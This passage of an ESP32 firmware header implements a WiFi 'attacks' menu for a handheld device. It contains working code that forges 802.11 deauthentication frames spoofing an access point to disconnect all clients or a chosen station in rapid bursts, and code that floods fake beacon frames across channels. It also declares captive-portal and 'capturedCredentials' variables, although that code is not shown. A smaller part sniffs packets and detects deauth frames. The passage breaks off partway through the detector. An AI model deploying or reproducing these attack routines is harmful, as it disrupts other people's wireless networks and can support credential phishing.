#ifndef WIFI_MENU_H
#define WIFI_MENU_H

#include "SPIFFS.h"
#include "FS.h"
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include <vector>
std::vector<String> stationMACs;

// ---------- Global for packet monitor and PCAP ----------
volatile bool monitorRunning = false;
volatile unsigned long packetCount = 0;
bool pcapWriting = false;
File pcapFile;
unsigned long pcapPacketCount = 0;
bool sdCardReady = false;               // ✅ added missing variable
#define GRAPH_WIDTH 200
#define GRAPH_HEIGHT 80

extern TFT_eSPI tft;

// ---------- SD Card for packet capture (same pins as Bluetooth menu) ----------
#ifndef SD_CS_PIN
#define SD_CS_PIN   10
#define SD_MOSI_PIN 11
#define SD_MISO_PIN 6
#define SD_SCK_PIN  18
#endif

#include <SPI.h>
#include <SD.h>

#ifndef BTN_UP
#define BTN_UP    47
#define BTN_DOWN  36
#define BTN_LEFT  45
#define BTN_RIGHT 0
#define BTN_OK    35
#endif

#ifndef BG
#define BG        0x0000
#define TILE      0x2104
#define BORDER    0x39C7
#define SELECT    0xFD20
#define TEXT      0xC618
#define GREEN     0x07E0
#define WHITE     0xFFFF
#define RED       0xF800
#define YELLOW    0xFFE0
#endif

#define STATUSBAR_BG 0x3186

extern void drawStatusBar();
extern bool readButtonOnce(int pin);
extern void drawRoundedIcon(int x, int y, int w, int h, const uint16_t* icon, int radius);
extern void drawBattery(int x, int y);
extern void drawSignalBars(int x, int y);
extern void drawBluetooth(int x, int y);
extern void drawThermometer(int x, int y);
extern void drawGreenBox(int x, int y);

void drawStatusBarBright();
void drawWiFiMenu();
bool handleWiFiMenu();
void runPacketMonitor();
void runBeaconSpammer();
void runDeauther();
void showAPDetails(int apIndex, const char* ssid, uint8_t* bssid, int channel, int rssi, bool hasWPS);
void runDeauthDetector();
void scanStations(uint8_t* ap_bssid, int channel, const char* ap_ssid);   // ✅ fixed prototype
void runWiFiScanner();
void runCaptivePortal();
void send_beacon_frame(const char* ssid, uint8_t channel);
void send_deauth_frame(uint8_t* target_bssid, uint8_t* station_bssid, uint8_t channel);
void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
void promiscuous_station_cb(void *buf, wifi_promiscuous_pkt_type_t type);
void promiscuous_detector_cb(void *buf, wifi_promiscuous_pkt_type_t type);

void initSDCard() {
  if (sdCardReady) return;
  SPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
  if (!SD.begin(SD_CS_PIN, SPI)) {
    Serial.println("SD Card init failed");
    sdCardReady = false;
  } else {
    sdCardReady = true;
    Serial.println("SD Card ready");
  }
}

void writePcapGlobalHeader() {
  uint32_t magic = 0xa1b2c3d4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  uint32_t thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 65535;
  uint32_t linktype = 127;   // 802.11 (raw, no radiotap)
  pcapFile.write((uint8_t*)&magic, 4);
  pcapFile.write((uint8_t*)&version_major, 2);
  pcapFile.write((uint8_t*)&version_minor, 2);
  pcapFile.write((uint8_t*)&thiszone, 4);
  pcapFile.write((uint8_t*)&sigfigs, 4);
  pcapFile.write((uint8_t*)&snaplen, 4);
  pcapFile.write((uint8_t*)&linktype, 4);
}

// Promiscuous callback that writes packets to PCAP file
void promiscuous_pcap_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorRunning) return;
  packetCount++;
  if (!pcapWriting) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint64_t ts = pkt->rx_ctrl.timestamp;
  uint32_t ts_sec = ts / 1000000;
  uint32_t ts_usec = ts % 1000000;
  uint32_t incl_len = pkt->rx_ctrl.sig_len;
  uint32_t orig_len = incl_len;
  if (incl_len > 65535) incl_len = 65535;

  pcapFile.write((uint8_t*)&ts_sec, 4);
  pcapFile.write((uint8_t*)&ts_usec, 4);
  pcapFile.write((uint8_t*)&incl_len, 4);
  pcapFile.write((uint8_t*)&orig_len, 4);
  pcapFile.write(pkt->payload, incl_len);
  pcapPacketCount++;
}

void drawStatusBarBright() {
  tft.fillRect(0, 0, 240, 22, STATUSBAR_BG);
  tft.drawFastHLine(0, 22, 240, BORDER);
  drawBattery(10, 5);
  drawThermometer(40, 4);
  drawGreenBox(60, 5);
  drawBluetooth(170, 4);
  drawSignalBars(200, 4);
}

const char* wifiAttacks[] = {
  "Packet Monitor",
  "Beacon Spammer",
  "WiFi Deauther",
  "Deauth Detector",
  "WiFi Scanner",
  "Captive Portal",
  "Back to Main Menu"
};
#define WIFI_ATTACK_COUNT 7

const uint16_t icon_packet[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};
const uint16_t icon_beacon[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff
};
const uint16_t icon_deauth[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};
const uint16_t icon_detector[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};
const uint16_t icon_scanner[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff
};
const uint16_t icon_portal[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};
const uint16_t icon_back[] PROGMEM = {0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 
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0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff, 0xffff};

int wifiSelected = 0;
String target_ssid = "";
uint8_t target_bssid[6];
int target_channel = 0;
String target_station_mac = "";
volatile bool deauthDetected = false;
String detectedDeauthInfo = "";

#include <vector>
std::vector<String> stationIPs;
std::vector<String> stationHostnames;
DNSServer dnsServer;
WebServer server(80);
String capturedCredentials = "";

void drawWiFiMenu() {
  void scanStations(uint8_t* ap_bssid, int channel);
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(WHITE, BG);
  tft.setTextSize(1);
  tft.setCursor(10, 35);
  for (int i = 0; i < WIFI_ATTACK_COUNT; i++) {
    int y = 55 + i * 36;
    if (i == WIFI_ATTACK_COUNT - 1) y += 5;
    uint16_t color = (i == wifiSelected) ? SELECT : GREEN;
    tft.setTextColor(color, BG);
    int iconX = 10;
    int iconY = y - 12;
    const uint16_t* iconPtr = nullptr;
    switch (i) {
      case 0: iconPtr = icon_packet; break;
      case 1: iconPtr = icon_beacon; break;
      case 2: iconPtr = icon_deauth; break;
      case 3: iconPtr = icon_detector; break;
      case 4: iconPtr = icon_scanner; break;
      case 5: iconPtr = icon_portal; break;
      case 6: iconPtr = icon_back; break;
    }
    drawRoundedIcon(iconX, iconY, 32, 32, iconPtr, 6);
    tft.setCursor(50, y);
    tft.print(wifiAttacks[i]);
  }
}

bool handleWiFiMenu() {
  int old = wifiSelected;
  bool redraw = false;
  if (readButtonOnce(BTN_UP)) {
    wifiSelected--;
    if (wifiSelected < 0) wifiSelected = WIFI_ATTACK_COUNT - 1;
    redraw = true;
  }
  else if (readButtonOnce(BTN_DOWN)) {
    wifiSelected++;
    if (wifiSelected >= WIFI_ATTACK_COUNT) wifiSelected = 0;
    redraw = true;
  }
  else if (readButtonOnce(BTN_OK)) {
    if (wifiSelected == WIFI_ATTACK_COUNT - 1) return true;
    switch (wifiSelected) {
      case 0: runPacketMonitor(); break;
      case 1: runBeaconSpammer(); break;
      case 2: runDeauther(); break;
      case 3: runDeauthDetector(); break;
      case 4: runWiFiScanner(); break;
      case 5: runCaptivePortal(); break;
    }
    drawWiFiMenu();
    redraw = false;
  }
  if (redraw) {
    int oldY = 55 + old * 36 + (old == WIFI_ATTACK_COUNT - 1 ? 5 : 0);
    int newY = 55 + wifiSelected * 36 + (wifiSelected == WIFI_ATTACK_COUNT - 1 ? 5 : 0);
    tft.fillRect(50, oldY - 8, 150, 20, BG);
    tft.setTextColor(GREEN, BG);
    tft.setCursor(50, oldY);
    tft.print(wifiAttacks[old]);
    tft.fillRect(50, newY - 8, 150, 20, BG);
    tft.setTextColor(SELECT, BG);
    tft.setCursor(50, newY);
    tft.print(wifiAttacks[wifiSelected]);
  }
  return false;
}

void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorRunning) return;
  packetCount++;
}

#define GRAPH_WIDTH 200
#define GRAPH_HEIGHT 80
int packetRates[GRAPH_WIDTH] = {0};
int graphIndex = 0;
unsigned long lastGraphTime = 0;

void runPacketMonitor() {
  if (target_ssid == "") {
    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(RED, BG);
    tft.setCursor(10, 35);
    tft.print("No target selected!");
    tft.setCursor(10, 60);
    tft.print("Please scan first.");
    delay(2000);
    drawWiFiMenu();
    return;
  }

  // ---------- Display packet monitor UI ----------
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Packet Monitor (Live)");
  tft.setCursor(10, 55);
  tft.printf("Channel: %d", target_channel);
  tft.setCursor(10, 85);
  tft.print("Press OK to start/stop");
  tft.setCursor(10, 105);
  tft.print("Press UP to exit");

  bool monitoring = false;
  packetCount = 0;
  monitorRunning = false;

  // Set promiscuous callback to the simple counter (no SD writing)
  esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);

  // Reset graph
  for (int i = 0; i < GRAPH_WIDTH; i++) packetRates[i] = 0;
  graphIndex = 0;
  lastGraphTime = millis();

  while (true) {
    if (readButtonOnce(BTN_OK)) {
      monitoring = !monitoring;
      if (monitoring) {
        WiFi.mode(WIFI_MODE_STA);
        WiFi.disconnect();
        esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        monitorRunning = true;
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 125);
        tft.print(">>> MONITORING ACTIVE <<<");
      } else {
        esp_wifi_set_promiscuous(false);
        monitorRunning = false;
        tft.fillRect(10, 125, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_UP)) break;

    unsigned long now = millis();
    if (monitoring && (now - lastGraphTime >= 500)) {
      int rate = packetCount;
      packetRates[graphIndex] = rate;
      graphIndex = (graphIndex + 1) % GRAPH_WIDTH;
      packetCount = 0;
      lastGraphTime = now;

      tft.fillRect(30, 150, GRAPH_WIDTH, GRAPH_HEIGHT, BG);
      int maxRate = 1;
      for (int i = 0; i < GRAPH_WIDTH; i++) if (packetRates[i] > maxRate) maxRate = packetRates[i];
      if (maxRate < 10) maxRate = 10;
      for (int x = 0; x < GRAPH_WIDTH; x++) {
        int val = packetRates[(graphIndex + x) % GRAPH_WIDTH];
        int barHeight = (val * GRAPH_HEIGHT) / maxRate;
        if (barHeight > GRAPH_HEIGHT) barHeight = GRAPH_HEIGHT;
        uint16_t barColor = GREEN;
        if (val > maxRate * 0.7) barColor = RED;
        else if (val > maxRate * 0.3) barColor = SELECT;
        tft.drawLine(30 + x, 150 + GRAPH_HEIGHT - barHeight, 30 + x, 150 + GRAPH_HEIGHT, barColor);
      }
      tft.setTextColor(WHITE, BG);
      tft.setCursor(10, 240);
      tft.printf("Rate: %d pkts/0.5s  Total: %lu", rate, packetCount);
    }
    delay(50);
  }

  // Clean up on exit
  esp_wifi_set_promiscuous(false);
  monitorRunning = false;
  drawWiFiMenu();
}

void send_beacon_frame(const char* ssid, uint8_t channel) {
  uint8_t beacon_frame[256];
  int idx = 0;
  beacon_frame[idx++] = 0x80; beacon_frame[idx++] = 0x00;
  beacon_frame[idx++] = 0x00; beacon_frame[idx++] = 0x00;
  for (int i = 0; i < 6; i++) beacon_frame[idx++] = 0xFF;
  uint8_t fake_mac[6];
  for (int i = 0; i < 6; i++) fake_mac[i] = random(0x00, 0xFF);
  for (int i = 0; i < 6; i++) beacon_frame[idx++] = fake_mac[i];
  for (int i = 0; i < 6; i++) beacon_frame[idx++] = fake_mac[i];
  beacon_frame[idx++] = 0x00; beacon_frame[idx++] = 0x00;
  for (int i = 0; i < 8; i++) beacon_frame[idx++] = 0x00;
  beacon_frame[idx++] = 0x64; beacon_frame[idx++] = 0x00;
  beacon_frame[idx++] = 0x11; beacon_frame[idx++] = 0x04;
  beacon_frame[idx++] = 0x00;
  uint8_t ssid_len = strlen(ssid);
  beacon_frame[idx++] = ssid_len;
  memcpy(beacon_frame + idx, ssid, ssid_len);
  idx += ssid_len;
  beacon_frame[idx++] = 0x01; beacon_frame[idx++] = 0x08;
  uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  for (int i = 0; i < 8; i++) beacon_frame[idx++] = rates[i];
  beacon_frame[idx++] = 0x03; beacon_frame[idx++] = 0x01;
  beacon_frame[idx++] = channel;
  esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, idx, false);
}

void runBeaconSpammer() {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Beacon Spammer");
  tft.setCursor(10, 55);
  tft.print("Press OK to start/stop");
  tft.setCursor(10, 75);
  tft.print("Press UP to exit");

  bool spamming = false;
  char fake_ssids[50][20];
  const char* words[] = {"FreeWiFi","GuestNet","Public","Hotspot","Coffee","Airport","Mall","Library","Hotel","Starbucks"};
  for (int i = 0; i < 50; i++) {
    sprintf(fake_ssids[i], "%s_%d", words[random(0,10)], random(100,999));
  }
  unsigned long beaconCount = 0;
  
  // Setup Wi-Fi for raw transmission
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);

  // Live beacon log (scrolling)
  const int maxLogLines = 8;
  String beaconLog[maxLogLines];
  for (int i = 0; i < maxLogLines; i++) beaconLog[i] = "";
  int logIndex = 0;

  while (true) {
    if (readButtonOnce(BTN_OK)) {
      spamming = !spamming;
      if (spamming) {
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 95);
        tft.print(">>> SPAMMING BEACONS <<<");
      } else {
        tft.fillRect(10, 95, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_UP)) break;

    if (spamming) {
      // Rapidly send beacons on channels 1-11 and update log
      for (int ch = 1; ch <= 11; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 50; i++) {
          send_beacon_frame(fake_ssids[i], ch);
          beaconCount++;
          
          // Add to live log (show SSID and channel)
          char logEntry[40];
          sprintf(logEntry, "BCN: %s on CH%d", fake_ssids[i], ch);
          beaconLog[logIndex] = String(logEntry);
          logIndex = (logIndex + 1) % maxLogLines;
          
          // Update display: packet counter and log area
          tft.fillRect(10, 115, 220, 20, BG);
          tft.setTextColor(WHITE, BG);
          tft.setCursor(10, 115);
          tft.printf("Beacons sent: %lu", beaconCount);
          
          // Draw log with alternating colors (yellow / red)
          for (int j = 0; j < maxLogLines; j++) {
            int y = 140 + j * 15;
            if (y > 290) break;
            tft.fillRect(10, y, 220, 13, BG);
            if (beaconLog[(logIndex + j) % maxLogLines] != "") {
              // Alternate color: yellow if j is even, red if odd
              uint16_t logColor = (j % 2 == 0) ? YELLOW : RED;
              tft.setTextColor(logColor, BG);
              tft.setCursor(10, y);
              tft.print(beaconLog[(logIndex + j) % maxLogLines]);
            }
          }
          
          delay(1);  // high speed
        }
      }
    } else {
      delay(50);
    }
  }
  esp_wifi_set_promiscuous(false);
  drawWiFiMenu();
}

void send_deauth_frame(uint8_t* target_bssid, uint8_t* station_bssid, uint8_t channel) {
  // Ensure we are on the correct channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  uint8_t deauth_frame[26];
  int idx = 0;
  
  // Frame Control: Type=Management (00), Subtype=Deauth (1100)
  deauth_frame[idx++] = 0xC0;  // FC byte 1: version=0, type=0, subtype=12 (deauth)
  deauth_frame[idx++] = 0x00;  // FC byte 2: flags = 0
  
  // Duration (set to 0)
  deauth_frame[idx++] = 0x00;
  deauth_frame[idx++] = 0x00;
  
  // Destination address (station or broadcast)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = station_bssid[i];
  
  // Source address (AP BSSID)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = target_bssid[i];
  
  // BSSID (same as source)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = target_bssid[i];
  
  // Sequence control (fragment number 0, sequence number random)
  uint16_t seq = random(0, 4095);
  deauth_frame[idx++] = seq & 0xFF;
  deauth_frame[idx++] = (seq >> 8) & 0xFF;
  
  // Fixed parameters: Reason code (7 = class 3 frame received from non-associated station)
  deauth_frame[idx++] = 0x07;  // Reason code low byte
  deauth_frame[idx++] = 0x00;  // high byte
  
  // Send the frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, idx, false);
}

// ========== DEAUTHER FUNCTION ==========
void runDeauther() {
  if (target_ssid == "") {
    tft.fillRect(0, 23, 240, 297, BG);
    drawStatusBarBright();
    tft.setTextColor(RED, BG);
    tft.setCursor(10, 35);
    tft.print("No target selected!");
    tft.setCursor(10, 60);
    tft.print("Please scan first.");
    delay(2000);
    drawWiFiMenu();
    return;
  }

  // --- Selection menu for attack target ---
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("WiFi Deauther - Target Selection");
  tft.setCursor(10, 55);
  tft.printf("AP: %s (CH:%d)", target_ssid.c_str(), target_channel);
  tft.setCursor(10, 85);
  tft.print("Choose target:");
  tft.setCursor(10, 105);
  tft.print("1. Broadcast (all clients)");
  if (target_station_mac != "") {
    tft.setCursor(10, 125);
    tft.print("2. Specific station: " + target_station_mac);
  } else {
    tft.setTextColor(RED, BG);
    tft.setCursor(10, 125);
    tft.print("No station selected during scan.");
    tft.setTextColor(GREEN, BG);
  }
  tft.setCursor(10, 155);
  tft.print("Press DOWN to change, OK to start");

  int attackChoice = 1;  // 1 = broadcast, 2 = specific
  while (true) {
    if (readButtonOnce(BTN_DOWN) && target_station_mac != "") {
      attackChoice = (attackChoice == 1) ? 2 : 1;
      tft.fillRect(10, 100, 220, 60, BG);
      tft.setCursor(10, 105);
      tft.print((attackChoice == 1) ? "1. Broadcast (all clients)" : "2. Specific station: " + target_station_mac);
      tft.setCursor(10, 125);
      if (attackChoice == 1) tft.print(" ");
      else tft.print(" ");
      delay(200);
    }
    if (readButtonOnce(BTN_OK)) break;
    if (readButtonOnce(BTN_UP)) { drawWiFiMenu(); return; }
    delay(50);
  }

  // --- Attack screen ---
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Deauth Attack - LIVE");
  tft.setCursor(10, 55);
  tft.printf("Target AP: %s (CH:%d)", target_ssid.c_str(), target_channel);
  if (attackChoice == 2) {
    tft.setCursor(10, 75);
    tft.printf("Station: %s", target_station_mac.c_str());
  } else {
    tft.setCursor(10, 75);
    tft.print("Mode: BROADCAST (all clients)");
  }
  tft.setCursor(10, 100);
  tft.print("Press OK to start/stop, UP to exit");

  bool attacking = false;
  unsigned long deauthCount = 0;
  uint8_t broadcast_mac[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t station_mac[6];
  if (attackChoice == 2) {
    sscanf(target_station_mac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
           &station_mac[0], &station_mac[1], &station_mac[2],
           &station_mac[3], &station_mac[4], &station_mac[5]);
  }

  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  int packetLine = 0;
  const int maxLines = 8;
  String packetLog[maxLines];
  for (int i = 0; i < maxLines; i++) packetLog[i] = "";

  unsigned long lastBurst = 0;
  const int BURST_DELAY = 5;
  const int PACKETS_PER_BURST = 20;

  while (true) {
    if (readButtonOnce(BTN_OK)) {
      attacking = !attacking;
      if (attacking) {
        tft.setTextColor(RED, BG);
        tft.setCursor(10, 120);
        tft.print(">>> DEAUTH ACTIVE <<<");
      } else {
        tft.fillRect(10, 120, 220, 20, BG);
      }
      delay(200);
    }
    if (readButtonOnce(BTN_UP)) break;

    if (attacking) {
      unsigned long now = millis();
      if (now - lastBurst >= BURST_DELAY) {
        lastBurst = now;
        for (int i = 0; i < PACKETS_PER_BURST; i++) {
          if (attackChoice == 1) {
            send_deauth_frame(target_bssid, broadcast_mac, target_channel);
            if (i == 0) {
              packetLog[packetLine] = "Deauth -> Broadcast";
            }
          } else {
            send_deauth_frame(target_bssid, station_mac, target_channel);
            if (i == 0) {
              char macStr[18];
              sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                      station_mac[0], station_mac[1], station_mac[2],
                      station_mac[3], station_mac[4], station_mac[5]);
              packetLog[packetLine] = String("Deauth -> ") + macStr;
            }
          }
          deauthCount++;
          delay(1);
        }
        packetLine = (packetLine + 1) % maxLines;

        tft.fillRect(10, 140, 220, 20, BG);
        tft.setTextColor(WHITE, BG);
        tft.setCursor(10, 140);
        tft.printf("Packets sent: %lu", deauthCount);

        for (int i = 0; i < maxLines; i++) {
          int y = 165 + i * 15;
          if (y > 290) break;
          tft.fillRect(10, y, 220, 13, BG);
          if (packetLog[i] != "") {
            tft.setTextColor(YELLOW, BG);
            tft.setCursor(10, y);
            tft.print(packetLog[i]);
          }
        }
      }
    } else {
      delay(50);
    }
  }
  esp_wifi_set_promiscuous(false);
  drawWiFiMenu();
}

// ========== CALLBACK FUNCTIONS (global scope, outside any function) ==========
void promiscuous_detector_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  if ((pkt->payload[0] & 0xFC) == 0xC0) {
    deauthDetected = true;
    uint8_t* src = &pkt->payload[10];
    uint8_t* dst = &pkt->payload[4];
    char temp[64];
    sprintf(temp, "Deauth %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X",
            src[0],src[1],src[2],src[3],src[4],src[5],
            dst[0],dst[1],dst[2],dst[3],dst[4],dst[5]);
    detectedDeauthInfo = String(temp);
  }
}

void promiscuous_station_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t frameType = pkt->payload[0] & 0xFC;
  if (frameType == 0x40 || frameType == 0x80 || frameType == 0x00 || frameType == 0x20) {
    uint8_t* addr2 = &pkt->payload[10];
    char mac[18];
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", addr2[0],addr2[1],addr2[2],addr2[3],addr2[4],addr2[5]);
    String macStr = String(mac);
    bool found = false;
    for (size_t i = 0; i < stationMACs.size(); i++) {
      if (stationMACs[i] == macStr) { found = true; break; }
    }
    if (!found && macStr != "FF:FF:FF:FF:FF:FF" && macStr != "00:00:00:00:00:00") {
      stationMACs.push_back(macStr);
      stationIPs.push_back("unknown");
      stationHostnames.push_back("unknown");
    }
  }
}
void runDeauthDetector() {
  tft.fillRect(0, 23, 240, 297, BG);
  drawStatusBarBright();
  tft.setTextColor(GREEN, BG);
  tft.setCursor(10, 35);
  tft.print("Deauth Detector");
  tft.setCursor(10, 55);
  tft.print("Press OK to start/stop");
  tft.setCursor(10, 85);
  tft.print("Press UP to exit");
  bool detecting = false;
  deauthDetected = false;
